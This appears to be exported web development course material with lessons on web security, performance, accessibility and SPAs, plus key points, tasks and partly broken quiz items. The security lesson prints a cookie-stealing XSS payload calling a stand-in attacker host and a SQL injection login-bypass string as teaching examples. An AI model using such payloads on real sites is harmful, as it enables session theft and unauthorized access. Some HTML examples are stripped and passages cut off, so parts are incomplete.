What web security is: It is the practice of keeping three things safe in a web app. Confidentiality means only the right people can read data, such as a customer's address or order history. Integrity means data cannot be changed without permission, such as the price of rice or the balance in a wallet. Availability means the site keeps working for real users. Every attack we study breaks at least one of these three. The golden rule behind all of them is simple: never trust anything that comes from the client. Form fields, URL parameters, headers, cookies and JSON bodies can all be typed or edited by an attacker, because the browser is on the attacker's computer.

The OWASP Top 10: OWASP, the Open Worldwide Application Security Project, is a non-profit community that publishes free security guides. Its most famous document is the OWASP Top 10, a list of the most critical web application security risks, updated every few years from real-world data. Recent editions include categories such as Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable and Outdated Components, Identification and Authentication Failures, and Server-Side Request Forgery. You do not need to memorise the exact order, which changes between editions, but you should know that it exists.

Cross-site scripting (XSS): XSS happens when an attacker manages to get their own JavaScript running inside your page, in other users' browsers. Since the script runs on your site's origin, it can read what the page shows, act as the logged-in user, or send data to the attacker. Suppose Bazar shows product reviews and simply inserts the review text into the HTML. An attacker writes a review containing <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>. Every visitor who opens that product page now runs the attacker's code. That is the whole trick: data was treated as code.

The three kinds of XSS: Stored XSS is the review example; the malicious script is saved in the database and served to everyone who views it, so it is the most dangerous. Reflected XSS happens when the server takes something from the request, such as a search term in /search?q=..., and echoes it back into the page without escaping; the attacker sends victims a crafted link. DOM-based XSS happens entirely in the browser, when your own JavaScript reads something like location.hash and writes it into the page with innerHTML. In all three, the root cause is the same: untrusted text ends up being interpreted as HTML or script.

Defending against XSS: The main defence is output encoding, also called escaping. Before putting user text into HTML, convert special characters: < becomes <, > becomes >, & becomes &, and quotes become " or '. The browser then shows the attacker's script as harmless text instead of running it. Most template engines and front-end frameworks escape by default; React, for example, escapes values placed inside JSX, and you have to deliberately use an escape hatch to insert raw HTML. In plain JavaScript, use textContent instead of innerHTML for user data. A second layer is Content-Security-Policy, an HTTP response header such as Content-Security-Policy: script-src 'self', which tells the browser to run scripts only from your own origin and to block inline scripts. And mark session cookies HttpOnly so that even if a script runs, it cannot read document.cookie.

SQL injection: SQL injection happens when user input is glued directly into an SQL string. Suppose the Bazar login code builds the query like this: query = 'SELECT * FROM users WHERE email = ' + quote + email + quote + ' AND password_hash = ...'. If an attacker types the email as x' OR '1'='1' -- then the final SQL becomes SELECT * FROM users WHERE email = 'x' OR '1'='1' -- ' AND password_hash = .... The part '1'='1' is always true, and the double dash starts an SQL comment, so the password check is ignored. The database returns users, and the attacker may be logged in as the first user, often an admin. Other injected inputs can read whole tables with UNION, or even delete data.

The fix for SQL injection: Use parameterized queries, also called prepared statements. You write the SQL with placeholders, for example SELECT * FROM users WHERE email = ? (or $1, depending on the driver), and pass the value separately: db.query(sql, [email]). The database receives the SQL structure and the data on separate channels, so whatever the user typed is always treated as a value, never as SQL code. ORMs use parameters under the hood, which is one reason they are safer, but raw-query features inside ORMs can still be misused. Extra layers help: give the app's database account only the permissions it needs (no DROP TABLE rights), and validate inputs, such as checking that an id is a number.

Cross-site request forgery (CSRF): CSRF abuses the fact that browsers automatically attach cookies to requests. Suppose you are logged in to Bazar, and the session cookie is in your browser. You then visit a malicious page that contains a hidden form which auto-submits a POST to https://bazar.example/account/email, changing your email to the attacker's. Your browser sends the request with your Bazar cookie, so Bazar thinks you did it. The attacker never saw your cookie; they just made your browser do the request. Note the difference: XSS runs attacker code on your site, while CSRF makes your browser send an unwanted request from another site.

Defending against CSRF: The classic defence is a CSRF token: the server puts a random, secret value in each form (a hidden input) or gives it to the front-end, and checks it on every state-changing request. The attacker's site cannot read that token, because the same-origin policy stops it from reading your pages, so its forged request fails. The modern second layer is the SameSite cookie attribute. With SameSite=Lax, which most current browsers apply by default when a site does not set the attribute, the cookie is not sent on cross-site POST requests; SameSite=Strict blocks it on all cross-site requests. Also, never change data with GET requests, because links and images trigger GETs easily. APIs that use a token in an Authorization header instead of cookies are not exposed to classic CSRF, since the browser does not add that header automatically.

HTTPS, TLS and HSTS: Without encryption, anyone on the path, such as a person on the same public Wi-Fi in a cafe, can read or change HTTP traffic, including passwords and cookies. HTTPS is HTTP running inside TLS, which gives encryption, integrity and server authentication through certificates (the TLS handshake is covered in Computer Networks). As a web developer, your jobs are: serve every page over HTTPS, redirect HTTP to HTTPS, mark cookies Secure so they never travel over plain HTTP, and avoid mixed content, meaning an HTTPS page loading scripts or images over HTTP. Add the Strict-Transport-Security header, for example Strict-Transport-Security: max-age=31536000; includeSubDomains, so the browser remembers to use only HTTPS for your site for a year, even if a user types http://.

Broken access control and IDOR: Logging a user in is not enough; every request must also check whether this user may do this action on this object. A common bug is the insecure direct object reference, or IDOR. Bazar shows an order at /orders/1042. A curious user changes the number to /orders/1043 and sees a stranger's name, phone number and address, because the server only checked that someone was logged in, not that order 1043 belongs to them. The fix is a server-side ownership check on every request: SELECT * FROM orders WHERE id = ? AND user_id = ?. Hiding a button in the front-end is never access control, because anyone can send the request directly with a tool like curl.

Validate input on the server: Client-side validation in HTML and JavaScript is for user convenience only. An attacker can skip the browser entirely. So the server must check types, lengths, ranges and formats: quantity must be a whole number from 1 to 50, a phone number must match the expected pattern, a price must come from the database, never from the form. Prefer allow-lists, saying exactly what is valid, over block-lists, which try to guess every bad input and always miss some. Validation reduces risk but does not replace escaping and parameterized queries; you need all of them.

Secrets out of code: API keys, database passwords and the JWT signing secret must never be written in source code or pushed to GitHub. Automated bots scan public repositories for leaked keys within minutes. Store secrets in environment variables or a secrets manager, add .env files to .gitignore, and rotate (replace) any key that was ever exposed. Also, never put secrets in front-end JavaScript: everything sent to the browser can be read by the user.

Outdated dependencies and misconfiguration: A modern web app pulls in hundreds of packages from npm or similar registries. If one has a known vulnerability, your app has it too. Tools like npm audit, GitHub's Dependabot or similar scanners warn you about known problems, and you should update regularly. Misconfiguration is another big category: leaving debug mode on in production so stack traces leak internal details, default admin passwords, open cloud storage buckets, or detailed error messages that reveal SQL. Show users a generic error page and keep the details in server logs.

Clickjacking and security headers: In clickjacking, an attacker loads your page inside an invisible iframe on their site and tricks the user into clicking a button on it, for example 'Confirm order', while they think they are clicking something else. The defence is to forbid framing: send X-Frame-Options: DENY, or the newer CSP directive frame-ancestors 'none'. A few other headers are worth knowing: X-Content-Type-Options: nosniff stops the browser from guessing file types, and Referrer-Policy controls how much of the URL is sent to other sites. Many frameworks have middleware that sets a sensible group of these headers in one line.

Real-life example 1, securing Bazar's review box: A customer named Rafi submits a review. On the server, Bazar checks the length (maximum 1,000 characters), stores it with a parameterized INSERT, and when showing it, the template engine escapes it, so a review containing <script> shows up as visible text. The page also sends a Content-Security-Policy that allows scripts only from Bazar's own domain. Even if one layer had a bug, the next would likely stop the attack. This idea of several independent layers is called defence in depth.

Real-life example 2, a mobile wallet style transfer: Think of a payment page in an app like bKash or Nagad that works through the web. A transfer request must be sent over HTTPS, carry a valid session or token, include a CSRF token if cookies are used, be checked so the sender owns the source account (access control), have the amount validated on the server (positive, within limit), and be wrapped in a database transaction. On top, there is a PIN or OTP, because high-value actions deserve a second check. Each line of defence covers a different attack.

Common mistakes: Thinking HTTPS alone makes a site secure; it only protects data in transit, not against XSS or SQL injection. Escaping input when saving instead of escaping output for the right context when showing. Building SQL with string concatenation 'just for this quick admin page'. Trusting hidden form fields, such as a hidden price. Checking permissions only in the front-end. Writing custom crypto or custom sanitizers instead of using well-tested libraries. Logging passwords or tokens in plain text.

What exams ask: Define XSS and list its three types with one example each. Show how a given login query can be bypassed by SQL injection, then rewrite it with a prepared statement. Explain CSRF with a step-by-step scenario and two defences. Compare XSS and CSRF. Explain why HTTPS, HttpOnly, Secure and SameSite each matter. Name some OWASP Top 10 categories and explain broken access control with an IDOR example.

Recap: Never trust the client. Escape output and use CSP and HttpOnly against XSS. Use parameterized queries against SQL injection. Use CSRF tokens, SameSite cookies and no state changes on GET against CSRF. Serve everything over HTTPS with HSTS and Secure cookies. Check ownership and permissions on the server for every request. Validate input on the server, keep secrets out of code, update dependencies, and set security headers. Security is not one feature added at the end; it is a habit in every line you write.
key_points: Never trust anything from the client: forms, URLs, headers, cookies and JSON can all be forged.
The OWASP Top 10 lists the most critical web risks; broken access control and injection have stayed near the top.
XSS (stored, reflected, DOM) runs attacker script in your page; defend with output escaping, textContent, CSP and HttpOnly cookies.
SQL injection glues input into SQL; defend with parameterized queries and least-privilege database accounts.
CSRF makes a victim's browser send a forged request with its cookies; defend with CSRF tokens, SameSite cookies and no state changes on GET.
HTTPS protects data in transit; add HSTS, Secure cookies and avoid mixed content.
Check ownership on the server for every request to stop IDOR; hiding buttons is not access control.
Defence in depth: validation, escaping, headers, secret management and updated dependencies work together.
lessons.tip: For every input box you build, ask two questions: where does this text end up (HTML, SQL, shell, URL), and what makes it safe there? That one habit prevents most of the OWASP Top 10.
lessons.task: Write this vulnerable query on paper: 'SELECT * FROM products WHERE name = ' + quote + userInput + quote. Find an input that returns every product, then rewrite the query as a parameterized one and explain in two lines why your attack no longer works. Bonus: open DevTools on any site you use, check the response headers for Strict-Transport-Security and Content-Security-Policy.

quiz.q: A malicious script is saved in a product review and runs for every visitor who opens that page. What is this?
quiz.explain: The script is stored in the database and served to all viewers, which is stored XSS, the most dangerous kind.

quiz.q: What is the standard fix for SQL injection?
quiz.explain: Placeholders send the SQL structure and the data separately, so input is never treated as SQL code.

quiz.q: Why does a CSRF attack work at all?
options: The browser automatically attaches cookies to requests to that site
quiz.explain: The forged request from another site carries the victim's cookies automatically, so the server thinks the victim sent it.

quiz.q: A user changes /orders/1042 to /orders/1043 and sees a stranger's order. Which risk is this?
quiz.explain: The server did not check that the order belongs to the logged-in user; that is an insecure direct object reference, a kind of broken access control.

quiz.q: Which header tells the browser to use only HTTPS for a site for a set time?
quiz.explain: HSTS (Strict-Transport-Security with max-age) makes the browser refuse plain HTTP for that site.

lessons.title: Web Performance: Rendering, Caching, CDNs, Compression, Lazy Loading and Core Web Vitals
lessons.content:
Imagine two tea stalls side by side near Dhaka University. At the first one, the tea maker starts boiling water only after you order, then goes to buy milk. At the second, water is already hot, cups are ready, and the most popular order is half prepared. Both make the same tea, but the second stall gets all the customers. Websites are the same. Two pages can show identical content, yet one appears in one second and the other in eight, and users leave the slow one. Web performance is the craft of making the second kind of stall: deciding what to prepare early, what to carry less of, and what to deliver from closer by.

Why speed matters: A slow page loses people. Many users, especially on mobile data with a weak signal in a village or a crowded bus, give up if nothing appears within a few seconds. Speed also affects money and reach: a faster checkout means more completed orders on Bazar, and Google uses page experience signals, including Core Web Vitals, as part of its ranking. Performance is also fairness: a page that is 5 MB costs real money to someone on a small mobile data pack. So we measure and improve two things: how many bytes we send, and how quickly the browser can turn them into something visible and usable.

What the browser does with a page: To fix slowness you need to know the steps, called the critical rendering path. First the browser downloads the HTML and parses it into the DOM tree. When it meets a link to a CSS file, it downloads and parses that into the CSSOM, the CSS object model. It combines DOM and CSSOM into the render tree, which holds only the visible elements with their computed styles. Then comes layout, also called reflow, where it calculates the exact position and size of every box. Then paint, where pixels are filled in, and compositing, where layers are put together on screen. Anything that delays these steps delays the first thing the user sees.

Render-blocking resources: CSS is render-blocking: the browser will not paint the page until it has the CSS, because otherwise the page would flash unstyled. A normal script tag is parser-blocking: when the parser meets <script src='app.js'>, it stops building the DOM, downloads and runs the script, then continues. That is why old advice said to put scripts at the end of body. Today we use the defer attribute, which downloads the script in parallel and runs it after the HTML is parsed, in order, or async, which runs it as soon as it arrives, in any order, good for independent scripts like analytics. For CSS, keep it small, load only what the page needs, and for very important pages inline the small critical CSS needed for the first screen.

Counting the cost, a worked example: Suppose the Bazar home page has 1 HTML file of 30 KB, 1 CSS file of 120 KB, 3 JavaScript files of 300 KB each, and 20 product images of 200 KB each. Total = 30 + 120 + 900 + 4,000 = 5,050 KB, about 5 MB. On a connection delivering 1 MB per second, that is roughly 5 seconds of pure transfer, ignoring round trips. Images are about 80 percent of the bytes, so they are the first target. If we shrink each image to 50 KB and compress JS to 300 KB total, the page becomes 30 + 120 + 300 + 1,000 = 1,450 KB, under 1.5 seconds of transfer. Measuring first tells you where the real weight is.

HTTP caching from the developer's side: The fastest request is the one never made. You control browser caching with the Cache-Control response header (the network-side mechanics of conditional GET are in Computer Networks). Cache-Control: max-age=31536000, immutable says 'keep this for a year and do not even ask again'. Cache-Control: no-cache means 'you may store it, but check with me before using it'. Cache-Control: no-store means 'never store it', used for private data like a bank statement. Private means only the user's browser may cache it, not shared caches; public allows shared caches and CDNs too.

Revalidation with ETag: When a cached copy needs checking, the server can give each version of a file a tag, for example ETag: '5f3a9c'. Next time, the browser sends If-None-Match: '5f3a9c'. If the file has not changed, the server replies 304 Not Modified with no body, saving the download. If it changed, the server sends 200 with the new file and a new ETag. The older pair Last-Modified and If-Modified-Since works the same way using dates.

Cache busting with fingerprinted filenames: A common professional pattern is to put a hash of the file content into its name, such as app.3f9a2c.js. Then you can cache it for a year with immutable. When you change the code, the build tool produces a new name, like app.81bd07.js, and the HTML points to the new name, so users get the new file at once. The HTML itself is usually given no-cache, so the browser always checks for the latest page that points to the latest files.

CDNs: A content delivery network keeps copies of your static files, such as images, CSS and JS, on servers in many cities. A user in Chattogram fetching Bazar's images may be served from a nearby edge server instead of an origin server in Singapore or Europe, cutting the round-trip time a lot. CDNs also absorb traffic spikes, for example during an Eid sale, and many provide compression, HTTPS and attack filtering. You usually just point a domain like cdn.bazar.example at the CDN, and set good Cache-Control headers so the CDN knows how long to keep each file.

Minification and bundling: Minification removes what humans need but machines do not: spaces, newlines, comments, and long local variable names. A function written as function calculateTotal(items) { let total = 0; ... } might become function c(t){let e=0;...}. It behaves the same but is smaller. Bundlers such as webpack, Vite, esbuild or Rollup combine many small modules into fewer files, remove unused code (called tree shaking), and can split code so each page only loads what it needs, which is called code splitting. With HTTP/2 many small files are cheaper than before, so the goal is sensible chunks, not one giant file.

Compression: Text files compress very well because they repeat words like function, div and class. The server compresses responses with gzip or Brotli, and the browser announces what it supports with Accept-Encoding: gzip, br. The response says Content-Encoding: br. Brotli usually produces smaller files than gzip for text. Compression often shrinks HTML, CSS and JS by around 60 to 80 percent. Images like JPEG and PNG are already compressed, so gzipping them gives little benefit; they need their own optimization.

Images: Choose the right format: JPEG for photos, PNG for graphics needing sharp edges or transparency, SVG for logos and icons (they are tiny text files that scale perfectly), and the newer WebP and AVIF formats, which usually give smaller files than JPEG at similar quality and are supported by modern browsers. Serve the right size: there is no point sending a 4000 pixel wide camera photo to a phone that shows it 400 pixels wide. Use srcset so the browser picks a suitable size (responsive images were covered in the responsive design lesson). Always set width and height attributes so the browser reserves space before the image loads.

Lazy loading: Why download 20 product images when the user sees only 4 on the first screen? The native attribute loading='lazy' on an img or iframe tells the browser to delay loading until the element is near the viewport. Bazar's product list then loads the first few images at once and the rest as the user scrolls. Do not lazy-load the main image at the top of the page, because that delays what the user sees first. JavaScript can be lazy-loaded too, using dynamic import() to fetch the code for, say, a review editor only when the user clicks 'Write a review'.

Core Web Vitals: Google defines three user-centred metrics. LCP, Largest Contentful Paint, measures loading: when the largest visible image or text block finishes rendering; good is 2.5 seconds or less. INP, Interaction to Next Paint, measures responsiveness: how long the page takes to visually respond after user interactions like taps and key presses; good is 200 milliseconds or less. INP replaced the older FID metric in 2024. CLS, Cumulative Layout Shift, measures visual stability: how much things jump around while loading; good is 0.1 or less. Everyone has tapped the wrong button because an ad suddenly pushed the page down; that is layout shift.

Fixing each vital: For LCP, make the hero image small and fast, preload it, do not lazy-load it, and cut render-blocking CSS and JS. For INP, avoid long JavaScript tasks on the main thread; split heavy work into smaller pieces, ship less JavaScript, and move heavy calculation to a Web Worker. For CLS, give images and videos width and height, reserve space for ads and banners, and avoid inserting content above existing content after load. Web fonts can also cause shifts or invisible text; font-display: swap shows a fallback font immediately.

Measuring with Lighthouse and DevTools: Chrome DevTools includes Lighthouse, which runs a test and gives scores for performance, accessibility, best practices and SEO with concrete suggestions. The Network tab lets you throttle to a slow connection such as 'Slow 4G' and see every file's size and timing; the Performance panel shows what the main thread is doing. Lab tests run on one machine; field data comes from real users on real phones. Google's PageSpeed Insights shows both for public sites. Always measure before and after a change.

Server-side speed: The front end is only half the story. A slow database query can make the server take 2 seconds before sending the first byte. Time to First Byte measures this delay. Common fixes are adding database indexes, avoiding the N+1 query problem, caching expensive results in memory or Redis, and keeping the server geographically close to users. Rendering pages on the server or generating them in advance also helps the first view.

Real-life example 1, Bazar before an Eid sale: Lighthouse shows LCP of 6 seconds on a slow 4G profile. The hero banner is a 2.5 MB PNG. The team converts it to a 150 KB WebP, preloads it, moves product images below the fold to loading='lazy', adds defer to scripts, turns on Brotli, puts static files on a CDN with year-long caching and fingerprinted names, and adds width and height to images. LCP drops to about 2 seconds and CLS falls close to 0. Nothing changed in the product; only how it was delivered.

Real-life example 2, a news site on result day: When exam results are published, a news portal gets a sudden flood of visitors. Serving the same article page to many people from a CDN cache, even with a short max-age like 60 seconds, means the origin server answers once per minute per edge instead of thousands of times. This is how sites survive traffic spikes without buying huge servers.

Common mistakes: Optimizing without measuring. Lazy-loading the top hero image. Caching HTML for a year so users never see updates. Forgetting width and height on images, which causes layout shift. Shipping a huge JavaScript framework for a mostly static page. Thinking a fast office Wi-Fi test reflects real users on budget phones.

What exams ask: Explain the critical rendering path. Difference between defer and async. Explain Cache-Control directives and ETag-based revalidation with 304. What a CDN is and why it helps. Define minification, bundling and compression. Name and explain LCP, INP and CLS with their good thresholds. Suggest five ways to speed up a given slow page.

Recap: Measure first. Send fewer bytes with compression, minification, better image formats and right sizes. Avoid needless requests with caching and fingerprinted files. Shorten the distance with CDNs. Load less up front with defer, code splitting and lazy loading. Keep the main thread free. Watch LCP, INP and CLS. A fast site respects the user's time and data pack.
key_points: Critical rendering path: HTML to DOM, CSS to CSSOM, render tree, layout, paint; CSS blocks rendering, plain scripts block parsing.
Use defer (ordered, after parsing) or async (as soon as ready) for scripts.
Cache-Control controls caching: max-age, immutable, no-cache (revalidate), no-store; ETag with If-None-Match gives 304 Not Modified.
Fingerprinted filenames like app.3f9a2c.js allow year-long caching with instant updates.
CDNs serve static files from nearby edge servers and absorb traffic spikes.
Minify, bundle with code splitting, compress text with gzip or Brotli, and use WebP or AVIF at the right size.
loading='lazy' delays off-screen images; never lazy-load the main hero image.
Core Web Vitals: LCP 2.5 s or less, INP 200 ms or less, CLS 0.1 or less; measure with Lighthouse and real-user data.
lessons.tip: Before optimizing anything, open the Network tab, sort by size, and look at the top five files. In most real sites, one or two oversized images or scripts are most of the problem.
lessons.task: Open any shopping or news site in Chrome, press F12, open Lighthouse and run a mobile performance report. Write down the LCP, INP or TBT, and CLS values and the top three suggestions. Then in the Network tab, find the largest file and check whether it has a Cache-Control header and a Content-Encoding.

quiz.q: Which script attribute downloads in parallel and runs scripts in order after the HTML is parsed?
quiz.explain: defer keeps document order and waits until parsing finishes; async runs each script as soon as it arrives.

quiz.q: A browser sends If-None-Match with an ETag and the file has not changed. What does the server reply?
quiz.explain: 304 tells the browser its cached copy is still valid, so no body is sent.

quiz.q: Which Core Web Vital measures how much content jumps around while the page loads?
quiz.explain: Cumulative Layout Shift measures visual stability; good is 0.1 or less.

quiz.q: Why can app.3f9a2c.js safely be cached for a year?
options: Its name changes whenever its content changes
quiz.explain: The hash in the name is a fingerprint of the content; new code gets a new name, so old cached copies are never wrongly reused.

quiz.q: Which image should NOT get loading='lazy'?
options: Product images far down the list
The large hero banner at the top of the page
quiz.explain: The hero image is usually the LCP element; lazy-loading it delays what the user sees first.

lessons.title: Web Accessibility: WCAG, Semantic HTML, Keyboard, Contrast and ARIA
lessons.content:
Imagine a new shopping mall in Dhaka with beautiful glass doors, but the only entrance is a long staircase. A man in a wheelchair, a grandmother with bad knees, and a mother pushing a pram all stand at the bottom, unable to enter. Nothing is wrong with them; the building was designed without them in mind. Add a ramp, and suddenly everyone can enter, including the delivery man with a heavy trolley. Web accessibility is building ramps into websites: making sure people with different abilities can perceive, understand, navigate and use your pages. Who benefits: Accessibility, often shortened to a11y (a, then 11 letters, then y), helps people who are blind and use screen readers, people with low vision who zoom to 200 or 400 percent, people with colour blindness, deaf and hard-of-hearing users who need captions, people who cannot use a mouse and rely on a keyboard or switch device, and people with cognitive or learning differences who need clear, predictable pages. The WHO estimates that about 1.3 billion people, roughly one in six, live with a significant disability. Accessibility also helps everyone in temporary or situational limits: a broken arm, bright sunlight on a phone screen, a noisy bus where you cannot play sound, or an elderly parent with shaky hands. Why developers must care: First, it is simply right: the web should work for everyone. Second, many countries have laws or government rules requiring accessible websites, especially for public services, and lawsuits over inaccessible sites happen. Third, accessible sites are usually better for all users and for search engines, because the same semantic structure that a screen reader uses is what Google's crawler reads. Fourth, fixing accessibility at design time is cheap; fixing it after launch is expensive. WCAG: The Web Content Accessibility Guidelines are published by the W3C's Web Accessibility Initiative. Versions are 2.0 (2008), 2.1 (2018) and 2.2 (2023). Each guideline has testable success criteria at three conformance levels: A (the minimum), AA (the usual target in laws and company policies) and AAA (the highest, not required for whole sites because some content cannot meet it). When a contract says 'WCAG 2.1 AA', it means every page must meet all level A and AA criteria of that version. The four POUR principles: WCAG is organised around four principles. Perceivable: users must be able to perceive the content, so give text alternatives for images, captions for video and enough contrast. Operable: users must be able to operate the interface, so everything must work with a keyboard, users need enough time, and nothing should flash in a way that can trigger seizures. Understandable: text and behaviour must be understandable, so use clear language, predictable navigation and helpful error messages. Robust: content must work with many browsers and assistive technologies, so use valid, standard HTML that tools can interpret. Alt text for images: A screen reader cannot see a picture; it reads the alt attribute. For Bazar's product image, write , describing what matters, not 'image' or 'rice.jpg'. If the image is a link, the alt should describe where the link goes. If an image is purely decorative, like a background swirl, use an empty alt, alt='', so the screen reader skips it. Leaving alt out entirely is worst: many screen readers then read the file name, such as 'IMG underscore 4 0 3 2 dot jpg'. Complex images like charts need a nearby text summary of the data. Headings and page structure: Screen reader users often jump through a page by headings, like reading the table of contents. So use one h1 for the page title and then h2, h3 in a logical order without skipping levels for looks. Use landmark elements such as header, nav, main and footer, which screen readers announce and let users jump to. A 'Skip to main content' link at the very top, visible when focused, lets keyboard users avoid tabbing through 30 menu links on every page. Also set the page language, or lang='bn', so the screen reader uses the right pronunciation. Form labels and errors: Every input needs a programmatic label. connects them, so the screen reader says 'Phone number, edit text' and clicking the label focuses the field, which also helps people with shaky hands. Placeholder text is not a label: it disappears when typing and often has low contrast. When validation fails, show an error in text near the field, explain how to fix it ('Phone must be 11 digits starting with 01'), and do not rely on red colour alone. Linking the message with aria-describedby lets the screen reader read it with the field. Colour and contrast: Text must stand out from its background. WCAG level AA requires a contrast ratio of at least 4.5:1 for normal text and 3:1 for large text (about 18 point, or 14 point bold). Black on white is 21:1, the maximum; light grey #999999 on white is about 2.8:1, which fails for normal text. Contrast checkers in DevTools and online tools calculate the ratio for you. Also, never use colour as the only way to convey information. A form that marks wrong fields only in red is invisible to someone with red-green colour blindness; add an icon or the word 'Error'. Keyboard access: Many people navigate with only a keyboard: Tab moves to the next interactive element, Shift+Tab goes back, Enter activates links and buttons, Space toggles checkboxes and presses buttons, and arrow keys move within menus and radio groups. Native elements like a, button, input and select are keyboard-accessible automatically. The classic mistake is a 'button' made from a div with a click handler:
Add
. It cannot be reached by Tab, cannot be pressed with Enter, and the screen reader does not call it a button. The fix is simply . Visible focus: When you tab through a page, the focused element should have a clear outline so users know where they are. Some designers remove it with outline: none because it looks 'ugly'; that makes the site unusable by keyboard. If you restyle it, use :focus-visible to show a strong custom focus ring. Focus order should follow the visual order, which happens naturally if the HTML source order matches the layout. When a modal dialog opens, move focus into it, keep focus inside while it is open, and return focus to the button that opened it when it closes. Semantic HTML first: The single most effective accessibility technique is using the right HTML element. A button element is focusable, works with Enter and Space, and is announced as 'button'. A nav is announced as navigation. A table with th headers lets the screen reader say which column a cell belongs to. A list with ul and li tells the user how many items there are. Every div you use instead of the proper element is work you must redo by hand, and you will probably miss something. ARIA: WAI-ARIA, Accessible Rich Internet Applications, is a set of HTML attributes that add accessibility information when HTML alone cannot express it. role tells what something is, such as role='dialog' or role='tablist'. Properties and states describe it: aria-label gives a name to an icon-only button, like a cart icon:
key_points: Accessibility (a11y) lets people with visual, hearing, motor and cognitive disabilities, and everyone in temporary limits, use the web.
WCAG from the W3C has levels A, AA (usual target) and AAA, built on POUR: Perceivable, Operable, Understandable, Robust.
Give meaningful alt text; use alt='' for decorative images; never leave alt missing.
Use logical headings, landmarks, a skip link, lang on html, and a label for every input.
AA contrast: 4.5:1 for normal text, 3:1 for large text; never use colour alone to carry meaning.
Everything must work with a keyboard, with a visible focus indicator; use real buttons and links, not clickable divs.
First rule of ARIA: prefer native HTML; use role, aria-label, aria-expanded and aria-live only where HTML cannot express it.
Test with keyboard only, Lighthouse or axe, and a screen reader such as NVDA, VoiceOver or TalkBack.
lessons.tip: Spend five minutes navigating your own project with only the Tab key and your eyes closed for the last minute. You will find more accessibility bugs this way than by reading any checklist.
lessons.task: Pick any website you use often. Using only the keyboard (Tab, Shift+Tab, Enter, Space), try to reach the search box, search for something and open a result. Write down every place where you got stuck or could not see where focus was. Then run Lighthouse's accessibility audit and compare its findings with yours.

quiz.q: Which WCAG level is the usual target in laws and company policies?
quiz.explain: AA is the common target; A is the minimum and AAA is the highest, not required for whole sites.

quiz.q: What is the correct alt text for a purely decorative background swirl image?
quiz.explain: An empty alt tells screen readers to skip the image; leaving it out may make them read the file name.

quiz.q: What minimum contrast ratio does WCAG AA require for normal-size text?
quiz.explain: AA needs 4.5:1 for normal text and 3:1 for large text; 21:1 is black on white, the maximum.

quiz.q:
Why is
Add
a poor button?
options: It is not keyboard-focusable and is not announced as a button
quiz.explain: A native button gets focus, Enter and Space handling and the button role automatically; a div gets none of these.

quiz.q: What does the first rule of ARIA say?
options: ARIA replaces the need for keyboard support
Prefer a native HTML element or attribute when one already provides the meaning and behaviour
quiz.explain: Native elements bring built-in semantics and behaviour; ARIA only changes what assistive tech is told and should fill real gaps.

lessons.title: SPAs, Front-End Frameworks and SEO: React, Vue, Angular, SSR and Being Found on Google
lessons.content:
Imagine two ways of reading a newspaper. In the first, every time you want the sports page, a delivery boy runs to the press and brings you a whole new newspaper. In the second, you have one newspaper in your hands and simply flip to the sports page; only the pages you need change. Classic websites work like the first way: every click loads a brand new page from the server. Single-page applications work like the second: the page loads once, and JavaScript swaps parts of it as you move around. This lesson explains both styles, the frameworks that make SPAs practical, and how to make sure search engines can still find and understand your pages. Multi-page applications: In a multi-page application, or MPA, each URL maps to a page that the server builds and sends as complete HTML. Click 'Vegetables' on Bazar and the browser requests /vegetables, receives a full new HTML document, throws away the old page and draws the new one. This is simple, works without JavaScript, is naturally friendly to search engines, and each page starts fresh. The downsides: every navigation reloads the header, menu and scripts, the screen blinks, and anything kept only in the page, such as the scroll position or a half-typed search, is lost. Single-page applications: In an SPA, the server sends one HTML shell, usually almost empty, plus a JavaScript bundle. The JavaScript builds the interface in the browser. When you click 'Vegetables', no new page is requested; the app fetches just the data, for example GET /api/products?category=vegetables returning JSON, and redraws only the product list. Navigation feels instant and app-like, like Gmail, Facebook or Google Maps. The costs: a bigger JavaScript download before anything useful appears, more work on slow phones, more complexity, and extra effort for SEO and accessibility. Client-side routing: An SPA still needs real URLs so that users can bookmark, share and use the back button. The browser's History API makes this possible. When the user clicks a link, the router calls history.pushState(data, '', '/vegetables'), which changes the address bar without loading a page, and then renders the matching view. When the user presses Back, the browser fires a popstate event, and the router renders the previous view. A route table maps patterns to views, such as /products/:id to a product detail component. One catch: if a user opens /vegetables directly, the server must send the same HTML shell for that path instead of a 404, so the hosting must be configured with a fallback. Components: Modern front-end frameworks build interfaces from components: small, reusable pieces that combine markup, style and behaviour. Bazar's page might be App containing Header, SearchBar, ProductList and CartSummary, and ProductList contains many ProductCard components. Each component is like a custom HTML tag you invented. Writing ProductCard once and reusing it 200 times keeps the code consistent: fix a bug in one place and it is fixed everywhere. Props and state: Data flows into a component as props, short for properties, like arguments to a function. ProductCard receives props such as name='Potato', price=40 and unit='kg'. A component's own changing data is called state, such as whether a dropdown is open or how many items are in the cart. The core idea of these frameworks is that the UI is a function of state: UI = f(state). You do not write step-by-step DOM commands like 'find the span and change its text'. You change the state, for example cartCount = cartCount + 1, and the framework updates the screen to match. Declarative UI and the virtual DOM: Telling the computer what the result should look like, instead of every step to get there, is called declarative programming. Manually updating the real DOM in many places is error-prone and can be slow if done carelessly. React's approach is the virtual DOM: when state changes, React builds a new lightweight description of the UI in JavaScript objects, compares it with the previous description (this comparison is called diffing or reconciliation), and then applies only the minimal real DOM changes needed. If only the cart count changed from 2 to 3, only that text node is updated. Other frameworks reach the same goal in different ways, for example by tracking exactly which data each part of the page depends on. React: React is a JavaScript library for building user interfaces, created at Facebook (now Meta) and released as open source in 2013. Components are usually JavaScript functions that return JSX, an HTML-like syntax inside JavaScript, for example function ProductCard(props) { return
{props.name}: {props.price} taka
; }. State is managed with hooks such as useState. React itself focuses on the view; routing, data fetching and other parts come from separate libraries or from meta-frameworks built on top of it. It has a very large ecosystem and job market, and React Native reuses its ideas for mobile apps. Vue and Angular: Vue, created by Evan You and first released in 2014, is a progressive framework: you can add it to one part of an existing page or build a whole SPA. It uses HTML-based templates with special attributes such as v-if and v-for, and a reactivity system that automatically tracks which data each template uses. Many beginners find it gentle to learn. Angular, from Google, is a complete, opinionated framework written in TypeScript, with built-in routing, forms, HTTP client and dependency injection. It suits large teams that want one standard way of doing everything. The older AngularJS (version 1) is a different, now-retired framework, so do not confuse the two. Svelte is another approach that does most of its work at build time, compiling components into small JavaScript code. Choosing a framework: There is no single best one. The concepts transfer: components, props, state, one-way data flow, routing and talking to an API. A student who truly understands these in one framework can learn another in weeks. Pick based on the team's skills, the project's size, and the job market you are targeting, and remember that a simple content site may not need any SPA framework at all. Server-side 